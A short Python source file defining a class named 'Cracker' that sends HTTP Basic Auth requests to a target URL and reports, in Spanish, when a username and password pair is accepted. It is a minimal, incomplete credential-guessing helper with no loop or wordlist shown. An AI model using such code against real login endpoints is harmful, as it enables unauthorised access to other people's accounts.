import requests
from requests.auth import HTTPBasicAuth
class Cracker():
    def __init__(self, url):
        self.numrequests = 0
        self.urlattack = url

    def basicauthcrack(self, username, password):
        response = requests.get(self.urlattack, auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            print('Usuario y contraseña válidos')